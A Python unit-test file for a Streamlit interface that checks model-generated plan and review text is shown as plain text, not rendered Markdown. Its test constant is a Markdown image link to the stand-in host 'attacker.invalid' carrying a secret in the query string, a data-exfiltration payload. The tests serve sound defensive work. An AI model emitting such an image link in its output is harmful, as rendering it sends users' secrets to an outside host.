"""Regression tests for rendering model-controlled text without Markdown."""

from __future__ import annotations

from contextlib import nullcontext
from types import SimpleNamespace
import unittest
from unittest.mock import Mock, call, patch

from src.schemas import ReviewDecision
from src import ui


EXTERNAL_MARKDOWN = "![exfil](https://attacker.invalid/collect?secret=abc)"


def fake_streamlit() -> SimpleNamespace:
    metric = SimpleNamespace(metric=Mock())
    return SimpleNamespace(
        caption=Mock(),
        markdown=Mock(),
        write=Mock(),
        text=Mock(),
        subheader=Mock(),
        columns=Mock(return_value=[metric, metric, metric]),
        dataframe=Mock(),
        tabs=Mock(return_value=[nullcontext() for _ in range(5)]),
        expander=Mock(return_value=nullcontext()),
        success=Mock(),
        warning=Mock(),
    )


class PlainTextRenderingTests(unittest.TestCase):
    def test_bullet_items_use_plain_text(self) -> None:
        streamlit = fake_streamlit()
        with patch.object(ui, "st", streamlit):
            ui._bullet_list([EXTERNAL_MARKDOWN])

        streamlit.markdown.assert_not_called()
        streamlit.text.assert_called_once_with(f"• {EXTERNAL_MARKDOWN}")

    def test_plan_title_and_summary_use_plain_text(self) -> None:
        streamlit = fake_streamlit()
        plan = SimpleNamespace(
            title=EXTERNAL_MARKDOWN,
            summary=EXTERNAL_MARKDOWN,
            revision=1,
            resources=[],
            data_flow=[],
            high_availability_strategy=[],
            security_strategy=[],
            operations_strategy=[],
            cost_notes=[],
            assumptions=[],
        )

        with patch.object(ui, "st", streamlit):
            ui.render_plan(plan)  # type: ignore[arg-type]

        streamlit.write.assert_not_called()
        self.assertEqual(
            streamlit.text.call_args_list[:2],
            [
                call(EXTERNAL_MARKDOWN),
                call(EXTERNAL_MARKDOWN),
            ],
        )

    def test_review_summary_uses_plain_text_outside_status_container(self) -> None:
        streamlit = fake_streamlit()
        review = SimpleNamespace(
            decision=ReviewDecision.APPROVED,
            summary=EXTERNAL_MARKDOWN,
            strengths=[],
            findings=[],
            required_changes=[],
        )

        with patch.object(ui, "st", streamlit):
            ui.render_review(review)  # type: ignore[arg-type]

        streamlit.success.assert_called_once_with("审查通过", icon="✅")
        streamlit.text.assert_called_once_with(EXTERNAL_MARKDOWN)

    def test_finding_fields_are_not_used_as_active_expander_markdown(self) -> None:
        streamlit = fake_streamlit()
        finding = SimpleNamespace(
            severity="high",
            category=EXTERNAL_MARKDOWN,
            issue=EXTERNAL_MARKDOWN,
            recommendation=EXTERNAL_MARKDOWN,
        )
        review = SimpleNamespace(
            decision=ReviewDecision.REVISION_REQUIRED,
            summary="revise",
            strengths=[],
            findings=[finding],
            required_changes=[],
        )

        with patch.object(ui, "st", streamlit):
            ui.render_review(review)  # type: ignore[arg-type]

        expander_label = streamlit.expander.call_args.args[0]
        self.assertNotIn("attacker.invalid", expander_label)
        rendered_text = [call.args[0] for call in streamlit.text.call_args_list]
        self.assertIn(f"建议：{EXTERNAL_MARKDOWN}", rendered_text)


if __name__ == "__main__":
    unittest.main()
